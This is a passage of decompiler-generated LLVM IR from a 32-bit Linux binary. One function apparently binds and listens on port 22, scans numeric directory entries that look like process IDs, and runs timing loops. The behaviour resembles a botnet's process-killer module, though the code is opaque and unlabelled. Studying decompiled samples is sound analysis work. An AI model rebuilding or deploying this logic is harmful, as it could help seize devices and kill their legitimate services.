  %v1_804db08 = add i32 %v0_804d7a5, 1
  store i32 %v1_804db08, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804db10:                             ; preds = %dec_label_pc_804d793, %dec_label_pc_804d78b
  %v1_804db10 = and i32 %v0_804db10, -256
  %v2_804db10 = or i32 %v1_804db10, 1
  br label %dec_label_pc_804d7a5

dec_label_pc_804db17:                             ; preds = %dec_label_pc_804d6fb, %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d711

dec_label_pc_804db27:                             ; preds = %dec_label_pc_804d80b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db2e = call i32 @function_8051220(i8 6)
  store i32 %v3_804db2e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db3a = call i32 @function_8051220(i8 7)
  store i32 %v3_804db3a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db46 = call i32 @function_8051220(i8 9)
  store i32 %v3_804db46, i32* %eax.global-to-local, align 4
  %v2_804db56.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804db4e

dec_label_pc_804db4e:                             ; preds = %dec_label_pc_804d694, %dec_label_pc_804db27
  %v2_804db56 = phi i32 [ %v0_804d5e3, %dec_label_pc_804d694 ], [ %v2_804db56.pre, %dec_label_pc_804db27 ]
  %v0_804db54 = load i32, i32* @ebx, align 4
  store i32 %v0_804db54, i32* %eax.global-to-local, align 4
  store i32 %v2_804db56, i32* @ebx, align 4
  store i32 %v0_804d5e2, i32* @esi, align 4
  store i32 %v0_804d5e1, i32* @edi, align 4
  store i32 %v0_804d5e0, i32* @ebp, align 4
  ret i32 %v0_804db54

dec_label_pc_804db62:                             ; preds = %dec_label_pc_804d871, %dec_label_pc_804d859
  %v2_804db65 = inttoptr i32 %v1_804d866 to i32*
  %v3_804db65 = load i32, i32* %v2_804db65, align 4
  store i32 %v3_804db65, i32* %edx.global-to-local, align 4
  %v3_804db69 = inttoptr i32 %v0_804d866 to i32*
  store i32 %v3_804db65, i32* %v3_804db69, align 4
  %v0_804db6a = call i32 @function_80524e4()
  store i32 %v0_804db6a, i32* %eax.global-to-local, align 4
  %v0_804db6f = load i32, i32* @esp, align 4
  %v1_804db6f = add i32 %v0_804db6f, 20
  %v2_804db6f = inttoptr i32 %v1_804db6f to i8*
  %v3_804db6f = load i8, i8* %v2_804db6f, align 1
  %v4_804db6f = sext i8 %v3_804db6f to i32
  store i32 %v4_804db6f, i32* @ebx, align 4
  %v1_804db74 = add i32 %v0_804db6f, 16
  br label %dec_label_pc_804db77

dec_label_pc_804db77:                             ; preds = %dec_label_pc_804d82d, %dec_label_pc_804db62
  %v0_804db77 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804db74, %dec_label_pc_804db62 ]
  %v1_804db7a = add i32 %v0_804db77, -16
  %v2_804db7a = inttoptr i32 %v1_804db7a to i32*
  store i32 1, i32* %v2_804db7a, align 4
  %v1_804db7c = sext i8 %stack_var_-8769.2 to i32
  %v2_804db7c = call i32 @function_8053d40(i32 %v1_804db7c)
  store i32 %v2_804db7c, i32* %eax.global-to-local, align 4
  %v0_804db81 = load i32, i32* @esp, align 4
  %v1_804db81 = inttoptr i32 %v0_804db81 to i32*
  store i32 6, i32* %v1_804db81, align 4
  %v3_804db88 = call i32 @function_8051220(i8 %stack_var_-8769.2)
  store i32 %v3_804db88, i32* %eax.global-to-local, align 4
  %v0_804db8d = load i32, i32* @esp, align 4
  %v1_804db8d = inttoptr i32 %v0_804db8d to i32*
  store i32 7, i32* %v1_804db8d, align 4
  %v3_804db94 = call i32 @function_8051220(i8 %stack_var_-8769.2)
  store i32 %v3_804db94, i32* %eax.global-to-local, align 4
  %v0_804db99 = load i32, i32* @esp, align 4
  %v1_804db99 = inttoptr i32 %v0_804db99 to i32*
  store i32 9, i32* %v1_804db99, align 4
  %v3_804dba0 = call i32 @function_8051220(i8 %stack_var_-8769.2)
  %v0_804dba5 = load i32, i32* @esp, align 4
  %v0_804dba8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dba8, i32* %eax.global-to-local, align 4
  %v1_804dbaa = add i32 %v0_804dba5, 8780
  %v1_804dbb0 = inttoptr i32 %v1_804dbaa to i32*
  %v2_804dbb0 = load i32, i32* %v1_804dbb0, align 4
  store i32 %v2_804dbb0, i32* @ebx, align 4
  %v3_804dbb0 = add i32 %v0_804dba5, 8784
  %v1_804dbb1 = inttoptr i32 %v3_804dbb0 to i32*
  %v2_804dbb1 = load i32, i32* %v1_804dbb1, align 4
  store i32 %v2_804dbb1, i32* @esi, align 4
  %v3_804dbb1 = add i32 %v0_804dba5, 8788
  %v1_804dbb2 = inttoptr i32 %v3_804dbb1 to i32*
  %v2_804dbb2 = load i32, i32* %v1_804dbb2, align 4
  store i32 %v2_804dbb2, i32* @edi, align 4
  %v3_804dbb2 = add i32 %v0_804dba5, 8792
  %v1_804dbb3 = inttoptr i32 %v3_804dbb2 to i32*
  %v2_804dbb3 = load i32, i32* %v1_804dbb3, align 4
  store i32 %v2_804dbb3, i32* @ebp, align 4
  ret i32 %v0_804dba8

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804d5e0
  %v3_804dbb5 = load i8, i8* %stack_var_-48, align 1
  %v4_804dbb5 = sext i8 %v3_804dbb5 to i32
  %v4_804dbcb = zext i8 %tmp47 to i32
  %v6_804dbcb = and i32 %v4_804dbb5, -256
  %v7_804dbcb = or i32 %v6_804dbcb, %v4_804dbcb
  store i32 %v7_804dbcb, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804d694

dec_label_pc_804dbee:                             ; preds = %dec_label_pc_804d99d.backedge, %dec_label_pc_804d9b3, %dec_label_pc_804d99d.preheader
  %v0_804d9a6.lcssa = phi i32 [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ], [ %v0_804d9a688, %dec_label_pc_804d9b3 ], [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ]
  %v0_804dbf1 = load i32, i32* @ebp, align 4
  %v3_804dbf1 = inttoptr i32 %v0_804d9a6.lcssa to i32*
  store i32 %v0_804dbf1, i32* %v3_804dbf1, align 4
  %v0_804dbf2 = call i32 @function_80524e4()
  store i32 %v0_804dbf2, i32* %eax.global-to-local, align 4
  %v0_804dbf7 = load i32, i32* @esp, align 4
  %v1_804dbf7 = add i32 %v0_804dbf7, 16
  br label %dec_label_pc_804d859

; uselistorder directives
  uselistorder i32 %v1_804db08, { 1, 0 }
  uselistorder i32 %v1_804daf8, { 2, 0, 1 }
  uselistorder i32 %v0_804d9a1, { 1, 0, 2 }
  uselistorder i32 %v0_804daca, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804da9d, { 0, 2, 1 }
  uselistorder i32 %v0_804d9a688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804d98b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d90e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804d883, { 0, 2, 1 }
  uselistorder i32 %v1_804d866, { 1, 0 }
  uselistorder i32 %v0_804d866, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804d861, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d859, { 1, 0 }
  uselistorder i32 %v4_804d833, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d7ef, { 1, 0 }
  uselistorder i32 %v3_804d7e7, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7ca, { 0, 2, 1 }
  uselistorder i32 %v1_804d7a5, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804d786, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804d783, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804db10, { 1, 0, 2 }
  uselistorder i32 %v0_804daf8, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804d735, { 0, 2, 1 }
  uselistorder i32 %v7_804d732, { 1, 0 }
  uselistorder i32 %v0_804d72f, { 1, 0 }
  uselistorder i32 %v4_804d6dc, { 1, 2, 0 }
  uselistorder i32 %v7_804d718, { 1, 0, 2 }
  uselistorder i32 %v1_804d72f, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804d706, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804d705, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804d744, { 1, 0, 2 }
  uselistorder i32 %v2_804d66a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804d5ea, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804d5e4, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 91, 77, 78, 79, 80, 81, 82, 92, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32 (i8*, i32)* @function_8051cf0, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8054a8d.6 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8051e10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804db77, { 1, 0 }
  uselistorder label %dec_label_pc_804db4e, { 1, 0 }
  uselistorder label %dec_label_pc_804d99d.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d9b3, { 1, 0 }
  uselistorder label %dec_label_pc_804d859, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804d80b.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d6ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804d783, { 1, 0 }
  uselistorder label %dec_label_pc_804d744, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d6d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d711, { 1, 0 }
  uselistorder label %dec_label_pc_804d705, { 1, 0 }
  uselistorder label %dec_label_pc_804d694, { 1, 0 }
}

define i32 @function_804dc00() local_unnamed_addr {
dec_label_pc_804dc00:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-8388 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8460 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8460, align 4
  %v2_804dc0c = call i32 @function_8052452(i32* null)
  store i32 %v2_804dc0c, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc0c, i32* @esi, align 4
  %v0_804dc13 = call i32 @function_80521bf()
  store i32 %v0_804dc13, i32* %eax.global-to-local, align 4
  %v12_804dc18 = ptrtoint i32* %stack_var_-8444 to i32
  store i32 %v0_804dc13, i32* @global_var_8056924.21, align 4
  %tmp112 = icmp slt i32 %v0_804dc13, 1
  br i1 %tmp112, label %dec_label_pc_804dc2f, label %dec_label_pc_804dc24

dec_label_pc_804dc24:                             ; preds = %dec_label_pc_804ddc0, %dec_label_pc_804dc94, %dec_label_pc_804dc2f, %dec_label_pc_804dc00
  %v0_804dc2e = phi i32 [ -1, %dec_label_pc_804dc94 ], [ 0, %dec_label_pc_804dc2f ], [ %v0_804dc13, %dec_label_pc_804dc00 ], [ 0, %dec_label_pc_804ddc0 ]
  ret i32 %v0_804dc2e

dec_label_pc_804dc2f:                             ; preds = %dec_label_pc_804dc00
  %v1_804dc2f = add i32 %v0_804dc13, 1
  %v8_804dc2f = icmp eq i32 %v1_804dc2f, 0
  store i32 %v1_804dc2f, i32* %eax.global-to-local, align 4
  br i1 %v8_804dc2f, label %dec_label_pc_804dc24, label %dec_label_pc_804dc32

dec_label_pc_804dc32:                             ; preds = %dec_label_pc_804dc2f
  store i32 2, i32* %stack_var_-52, align 4
  store i32 5632, i32* %stack_var_-8460, align 4
  %v1_804dc4f = call i32 @function_804d5e0(i32 5632)
  store i32 %v1_804dc4f, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-8460, align 4
  %v3_804dc67 = call i32 @function_8052985(i32 2, i32 1, i32 0)
  store i32 %v3_804dc67, i32* %eax.global-to-local, align 4
  store i32 %v3_804dc67, i32* @ebx, align 4
  %v10_804dc71 = icmp eq i32 %v3_804dc67, -1
  br i1 %v10_804dc71, label %dec_label_pc_804dc94, label %dec_label_pc_804dc76

dec_label_pc_804dc76:                             ; preds = %dec_label_pc_804dc32
  %v2_804dc76 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804dc76, i32* %eax.global-to-local, align 4
  %v0_804dc7d = load i32, i32* @ecx, align 4
  store i32 %v3_804dc67, i32* %stack_var_-8460, align 4
  %v4_804dc82 = call i32 @function_805277f(i32 %v3_804dc67, i32 %v2_804dc76, i32 16, i32 %v0_804dc7d)
  %v2_804dc87 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dc87, i32* %eax.global-to-local, align 4
  %v0_804dc8b = load i32, i32* @ebx, align 4
  store i32 %v0_804dc8b, i32* %stack_var_-8460, align 4
  %v2_804dc8c = call i32 @function_805283b(i32 %v0_804dc8b, i32 1)
  store i32 %v2_804dc8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc94

dec_label_pc_804dc94:                             ; preds = %dec_label_pc_804dc32, %dec_label_pc_804dc76
  store i32 5, i32* %stack_var_-8460, align 4
  %v1_804dc99 = call i32 @function_8053d40(i32 5)
  store i32 %v1_804dc99, i32* %eax.global-to-local, align 4
  store i32 4096, i32* %stack_var_-8460, align 4
  %v1_804dca5 = call i32 @function_8052b24(i32 4096)
  %v2_804dca5 = inttoptr i32 %v1_804dca5 to i8*
  store i32 %v1_804dca5, i32* %eax.global-to-local, align 4
  store i32 %v1_804dca5, i32* @global_var_8056920.22, align 32
  store i8 0, i8* %v2_804dca5, align 1
  store i32 6, i32* %stack_var_-8460, align 4
  store i32 0, i32* @global_var_80568a0.23, align 32
  %v2_804dcc3 = call i32 @function_80512a0(i8 6)
  store i32 %v2_804dcc3, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804dccf = call i32 @function_80512a0(i8 7)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v3_804dcda = call i32 @function_80511f0(i32 6, i32* null)
  %v2_804dcdf = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dcdf, i32* @ebx, align 4
  %v2_804dce2 = ptrtoint i32* %stack_var_-8388 to i32
  store i32 %v2_804dce2, i32* %eax.global-to-local, align 4
  store i32 %v2_804dce2, i32* %stack_var_-8460, align 4
  %v2_804dceb = bitcast i32* %stack_var_-8388 to i8*
  %v3_804dceb = call i32 @function_8051c10(i8* %v2_804dceb, i32 %v3_804dcda)
  store i32 %v3_804dceb, i32* %eax.global-to-local, align 4
  %v2_804dcf4 = add i32 %v3_804dceb, %v2_804dce2
  store i32 %v2_804dcf4, i32* @ebx, align 4
  %v0_804dcf6 = call i32 @function_80521e5()
  store i32 %v0_804dcf6, i32* %eax.global-to-local, align 4
  %v2_804dcfe = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v0_804dcf6, i32* %stack_var_-8460, align 4
  %v3_804dd09 = sext i32 %v0_804dcf6 to i64
  %v4_804dd09 = call i32 @function_8052000(i64 %v3_804dd09, i32 10, i32 %v2_804dcfe)
  store i32 %v4_804dd09, i32* %eax.global-to-local, align 4
  %v0_804dd11 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd11, i32* %stack_var_-8460, align 4
  %v2_804dd12 = inttoptr i32 %v0_804dd11 to i8*
  %v3_804dd12 = call i32 @function_8051c10(i8* %v2_804dd12, i32 %v4_804dd09)
  %v2_804dd17 = load i32, i32* %stack_var_-8460, align 4
  store i32 %v2_804dd17, i32* @ebp, align 4
  %v0_804dd18 = load i32, i32* @ebx, align 4
  %v2_804dd18 = add i32 %v0_804dd18, %v3_804dd12
  store i32 %v2_804dd18, i32* @ebx, align 4
  store i32 %v4_804dd09, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v3_804dd1f = call i32 @function_80511f0(i32 7, i32* null)
  store i32 %v3_804dd1f, i32* %eax.global-to-local, align 4
  %v0_804dd27 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd27, i32* %stack_var_-8460, align 4
  %v2_804dd28 = inttoptr i32 %v0_804dd27 to i8*
  %v3_804dd28 = call i32 @function_8051c10(i8* %v2_804dd28, i32 %v3_804dd1f)
  store i32 %v3_804dd28, i32* @edi, align 4
  store i32 %v2_804dce2, i32* %eax.global-to-local, align 4
  store i32 %v2_804dce2, i32* %stack_var_-8460, align 4
  %v3_804dd38 = call i32 @function_80522a2(i8* %v2_804dceb, i32 0)
  store i32 %v3_804dd38, i32* %eax.global-to-local, align 4
  %v10_804dd40 = icmp eq i32 %v3_804dd38, -1
  br i1 %v10_804dd40, label %dec_label_pc_804dc24, label %dec_label_pc_804dd49

dec_label_pc_804dd49:                             ; preds = %dec_label_pc_804dc94
  store i32 %v3_804dd38, i32* %stack_var_-8460, align 4
  %v1_804dd4d = call i32 @function_8052191(i32 %v3_804dd38)
  store i32 %v1_804dd4d, i32* %eax.global-to-local, align 4
  store i32 6, i32* %stack_var_-8460, align 4
  %v2_804dd59 = call i32 @function_8051220(i8 6)
  store i32 %v2_804dd59, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8460, align 4
  %v2_804dd65 = call i32 @function_8051220(i8 7)
  %v0_804dd6d = load i32, i32* @global_var_8056920.22, align 32
  store i32 %v2_804dce2, i32* %eax.global-to-local, align 4
  store i32 %v2_804dce2, i32* %stack_var_-8460, align 4
  %v4_804dd7d = call i32 @function_8052362(i8* %v2_804dceb, i32 %v0_804dd6d, i32 4095)
  store i32 %v4_804dd7d, i32* %eax.global-to-local, align 4
  %v10_804dd87 = icmp eq i32 %v4_804dd7d, -1
  br i1 %v10_804dd87, label %dec_label_pc_804dd95, label %dec_label_pc_804dd8c

dec_label_pc_804dd8c:                             ; preds = %dec_label_pc_804dd49
  %v0_804dd8c = load i32, i32* @global_var_8056920.22, align 32
  store i32 %v0_804dd8c, i32* %eax.global-to-local, align 4
  %v2_804dd91 = add i32 %v0_804dd8c, %v4_804dd7d
  %v3_804dd91 = inttoptr i32 %v2_804dd91 to i8*
  store i8 0, i8* %v3_804dd91, align 1
  br label %dec_label_pc_804dd95

dec_label_pc_804dd95:                             ; preds = %dec_label_pc_804dd49, %dec_label_pc_804dd8c
  %v0_804dd9b = load i32, i32* @ebx, align 4
  %v1_804dd9b = load i32, i32* @edi, align 4
  %v2_804dd9b = sub i32 %v0_804dd9b, %v2_804dce2
  %v2_804dd9e = add i32 %v2_804dd9b, %v1_804dd9b
  store i32 %v2_804dd9e, i32* @eax, align 4
  %v0_804dda0 = load i32, i32* @esi, align 4
  store i32 %v0_804dda0, i32* @ebx, align 4
  store i32 400, i32* @esi, align 4
  store i32 %v2_804dce2, i32* @edi, align 4
  store i32 %v2_804dce2, i32* %stack_var_-8460, align 4
  %v2_804ddad = call i32 @function_8051c80(i32 %v2_804dce2, i32 %v2_804dd9e)
  store i32 %v2_804ddad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddc0

dec_label_pc_804ddc0:                             ; preds = %dec_label_pc_804dff3, %dec_label_pc_804dd95
  %storemerge8 = phi i32 [ %v1_804e000, %dec_label_pc_804dff3 ], [ %v12_804dc18, %dec_label_pc_804dd95 ]
  %v1_804ddc3 = add i32 %storemerge8, -16
  %v2_804ddc3 = inttoptr i32 %v1_804ddc3 to i32*
  store i32 6, i32* %v2_804ddc3, align 4
  %v2_804ddc5 = call i32 @function_80512a0(i8 0)
  store i32 %v2_804ddc5, i32* %eax.global-to-local, align 4
  %v0_804ddca = load i32, i32* @esp, align 4
  %v1_804ddca = inttoptr i32 %v0_804ddca to i32*
  %v2_804ddca = load i32, i32* %v1_804ddca, align 4
  store i32 %v2_804ddca, i32* %eax.global-to-local, align 4
  %v3_804ddca = add i32 %v0_804ddca, 4
  %v1_804ddcb = inttoptr i32 %v3_804ddca to i32*
  store i32 0, i32* %v1_804ddcb, align 4
  store i32 6, i32* %v1_804ddca, align 4
  %v3_804ddd0 = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804ddd0, i32* %eax.global-to-local, align 4
  %v1_804ddd5 = load i32, i32* @esp, align 4
  %v2_804ddd5 = inttoptr i32 %v1_804ddd5 to i32*
  store i32 %v3_804ddd0, i32* %v2_804ddd5, align 4
  %v1_804ddd8 = call i32 @function_8052554(i32 0)
  store i32 %v1_804ddd8, i32* %eax.global-to-local, align 4
  %v1_804dddd = load i32, i32* @esp, align 4
  %v2_804dddd = add i32 %v1_804dddd, 32
  %v3_804dddd = inttoptr i32 %v2_804dddd to i32*
  store i32 %v1_804ddd8, i32* %v3_804dddd, align 4
  %v0_804dde4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dde4 = icmp eq i32 %v0_804dde4, 0
  br i1 %v1_804dde4, label %dec_label_pc_804dc24, label %dec_label_pc_804ddec

dec_label_pc_804ddec:                             ; preds = %dec_label_pc_804ddc0
  %v0_804dde1 = load i32, i32* @esp, align 4
  %v2_804ddef = inttoptr i32 %v0_804dde1 to i32*
  store i32 6, i32* %v2_804ddef, align 4
  %v2_804ddf1 = call i32 @function_8051220(i8 0)
  store i32 %v2_804ddf1, i32* %eax.global-to-local, align 4
  %v0_804ddf6 = load i32, i32* @esp, align 4
  %v1_804ddf6 = add i32 %v0_804ddf6, 16
  br label %dec_label_pc_804de00

dec_label_pc_804de00:                             ; preds = %dec_label_pc_804e008, %dec_label_pc_804e014, %dec_label_pc_804de1a, %dec_label_pc_804e2cc, %dec_label_pc_804e031, %dec_label_pc_804dfe8, %dec_label_pc_804de5c, %dec_label_pc_804ddec
  %v0_804de00 = phi i32 [ %v1_804ddf6, %dec_label_pc_804ddec ], [ %v1_804de4e, %dec_label_pc_804de5c ], [ %v0_804dfea, %dec_label_pc_804dfe8 ], [ %v1_804e03b, %dec_label_pc_804e031 ], [ %v1_804e300, %dec_label_pc_804e2cc ], [ %v1_804de0d, %dec_label_pc_804de1a ], [ %v1_804de4e, %dec_label_pc_804e014 ], [ %v1_804de4e, %dec_label_pc_804e008 ]
  %v1_804de03 = add i32 %v0_804de00, 16
  %v2_804de03 = inttoptr i32 %v1_804de03 to i32*
  %v3_804de03 = load i32, i32* %v2_804de03, align 4
  store i32 %v3_804de03, i32* %eax.global-to-local, align 4
  %v2_804de07 = add i32 %v0_804de00, -16
  %v3_804de07 = inttoptr i32 %v2_804de07 to i32*
  store i32 %v3_804de03, i32* %v3_804de07, align 4
  %v0_804de08 = call i32 @function_8052645()
  store i32 %v0_804de08, i32* %eax.global-to-local, align 4
  %v0_804de0d = load i32, i32* @esp, align 4
  store i32 %v0_804de08, i32* @edx, align 4
  %v1_804de12 = icmp eq i32 %v0_804de08, 0
  br i1 %v1_804de12, label %dec_label_pc_804dff3, label %dec_label_pc_804de1a

dec_label_pc_804de1a:                             ; preds = %dec_label_pc_804de00
  %v1_804de0d = add i32 %v0_804de0d, 16
  %v1_804de1a = add i32 %v0_804de08, 11
  %v2_804de1a = inttoptr i32 %v1_804de1a to i8*
  %v3_804de1a = load i8, i8* %v2_804de1a, align 1
  %v4_804de1a = zext i8 %v3_804de1a to i32
  %v6_804de1a = and i32 %v0_804de08, -256
  %v7_804de1a = or i32 %v4_804de1a, %v6_804de1a
  %v1_804de1d = add i32 %v7_804de1a, -48
  %v8_804de1d = trunc i32 %v1_804de1d to i8
  store i32 %v1_804de1d, i32* %eax.global-to-local, align 4
  %v8_804de22 = icmp ugt i8 %v8_804de1d, 9
  br i1 %v8_804de22, label %dec_label_pc_804de00, label %dec_label_pc_804de24

dec_label_pc_804de24:                             ; preds = %dec_label_pc_804de1a
  store i32 %v1_804de1a, i32* @edi, align 4
  %v3_804de2a = inttoptr i32 %v0_804de0d to i32*
  store i32 %v1_804de1a, i32* %v3_804de2a, align 4
  %v0_804de2b = call i32 @function_8053b96()
  store i32 %v0_804de2b, i32* %eax.global-to-local, align 4
  %v0_804de30 = load i32, i32* @esp, align 4
  store i32 %v0_804de2b, i32* @ebp, align 4
  %v1_804de35 = add i32 %v0_804de30, 28
  %v2_804de35 = inttoptr i32 %v1_804de35 to i32*
  %v3_804de35 = load i32, i32* %v2_804de35, align 4
  %v1_804de39 = add i32 %v3_804de35, 1
  store i32 %v1_804de39, i32* %eax.global-to-local, align 4
  %v0_804de3a = load i32, i32* @esi, align 4
  store i32 %v1_804de39, i32* %v2_804de35, align 4
  %v5_804de40 = icmp slt i32 %v0_804de3a, %v0_804de2b
  %v0_804de63 = load i32, i32* @esp, align 4
  %v1_804de66 = add i32 %v0_804de63, -16
  %v2_804de66 = inttoptr i32 %v1_804de66 to i32*
  store i32 0, i32* %v2_804de66, align 4
  %v2_804de68 = call i32 @function_8052452(i32* null)
  store i32 %v2_804de68, i32* %eax.global-to-local, align 4
  br i1 %v5_804de40, label %dec_label_pc_804de63, label %dec_label_pc_804de42

dec_label_pc_804de42:                             ; preds = %dec_label_pc_804de24
  %v1_804de4c = load i32, i32* @ebx, align 4
  %v2_804de4c = sub i32 %v2_804de68, %v1_804de4c
  store i32 %v2_804de4c, i32* %eax.global-to-local, align 4
  %v0_804de4e = load i32, i32* @esp, align 4
  %v1_804de4e = add i32 %v0_804de4e, 16
  %v1_804de51 = add i32 %v2_804de4c, -600
  %v6_804de51 = sub i32 599, %v2_804de4c
  %v7_804de51 = and i32 %v6_804de51, %v2_804de4c
  %v8_804de51 = icmp slt i32 %v7_804de51, 0
  %v9_804de51 = icmp eq i32 %v1_804de51, 0
  %v10_804de51 = icmp slt i32 %v1_804de51, 0
  %v3_804de56 = icmp ne i1 %v10_804de51, %v8_804de51
  %v4_804de56 = or i1 %v9_804de51, %v3_804de56
  br i1 %v4_804de56, label %dec_label_pc_804e008, label %dec_label_pc_804de5c

dec_label_pc_804de5c:                             ; preds = %dec_label_pc_804de42
  store i32 400, i32* @esi, align 4
  br label %dec_label_pc_804de00

dec_label_pc_804de63:                             ; preds = %dec_label_pc_804de24
  store i32 %v2_804de68, i32* %eax.global-to-local, align 4
  %v0_804de6d = load i32, i32* @esp, align 4
  %v1_804de6d = inttoptr i32 %v0_804de6d to i32*
  store i32 6, i32* %v1_804de6d, align 4
  %v1_804de74 = load i32, i32* @esp, align 4
  %v2_804de74 = add i32 %v1_804de74, 24
  %v3_804de74 = inttoptr i32 %v2_804de74 to i32*
  store i32 %v2_804de68, i32* %v3_804de74, align 4
  %v2_804de78 = call i32 @function_80512a0(i8 0)
  store i32 %v2_804de78, i32* %eax.global-to-local, align 4
  %v0_804de7d = load i32, i32* @esp, align 4
  %v1_804de7d = inttoptr i32 %v0_804de7d to i32*
  store i32 7, i32* %v1_804de7d, align 4
  %v2_804de84 = call i32 @function_80512a0(i8 0)
  store i32 %v2_804de84, i32* %eax.global-to-local, align 4
  %v0_804de89 = load i32, i32* @esp, align 4
  %v1_804de89 = inttoptr i32 %v0_804de89 to i32*
  %v3_804de89 = add i32 %v0_804de89, 4
  %v1_804de8a = inttoptr i32 %v3_804de89 to i32*
  %v2_804de8a = load i32, i32* %v1_804de8a, align 4
  store i32 %v2_804de8a, i32* @ebx, align 4
  store i32 0, i32* %v1_804de8a, align 4
  store i32 6, i32* %v1_804de89, align 4
  %v3_804de8f = call i32 @function_80511f0(i32 0, i32* nonnull @0)
  store i32 %v3_804de8f, i32* %eax.global-to-local, align 4
  %v0_804de94 = load i32, i32* @esp, align 4
  %v1_804de94 = inttoptr i32 %v0_804de94 to i32*
  %v3_804de94 = add i32 %v0_804de94, 4
  %v1_804de95 = inttoptr i32 %v3_804de94 to i32*
  store i32 %v3_804de8f, i32* %v1_804de95, align 4
  %v1_804de97 = add i32 %v0_804de94, 8328
  store i32 %v1_804de97, i32* %eax.global-to-local, align 4
  store i32 %v1_804de97, i32* %v1_804de94, align 4
